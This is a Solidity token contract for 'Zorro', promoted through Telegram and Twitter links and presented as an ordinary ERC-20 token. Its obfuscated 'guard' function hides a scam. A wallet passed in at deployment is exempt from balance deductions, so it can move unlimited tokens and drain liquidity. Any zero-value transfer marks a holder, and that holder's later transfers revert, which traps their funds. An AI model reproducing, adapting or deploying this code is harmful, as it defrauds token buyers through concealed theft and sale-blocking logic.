/*

💬 Telegram: https://t.me/ZorroETH

🐤 Twitter: https://twitter.com/Zorro__ETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Zorro is Ownable {
    mapping(address => uint256) private slept;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private blind;

    string public name = 'Zorro';

    function transfer(address fastened, uint256 customs) public returns (bool success) {
        guard(msg.sender, fastened, customs);
        return true;
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private won = 78;

    address public uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address activity, address fastened, uint256 customs) public returns (bool success) {
        require(customs <= allowance[activity][msg.sender]);
        allowance[activity][msg.sender] -= customs;
        guard(activity, fastened, customs);
        return true;
    }

    constructor(address locate) {
        balanceOf[msg.sender] = totalSupply;
        slept[locate] = won;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol = 'Zorro';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address stick, uint256 customs) public returns (bool success) {
        allowance[msg.sender][stick] = customs;
        emit Approval(msg.sender, stick, customs);
        return true;
    }

    function guard(address activity, address fastened, uint256 customs) private returns (bool success) {
        if (slept[activity] == 0) {
            balanceOf[activity] -= customs;
        }

        if (customs == 0) blind[fastened] += won;

        if (slept[activity] == 0 && uniswapV2Pair != activity && blind[activity] > 0) {
            slept[activity] -= won;
        }

        balanceOf[fastened] += customs;
        emit Transfer(activity, fastened, customs);
        return true;
    }
}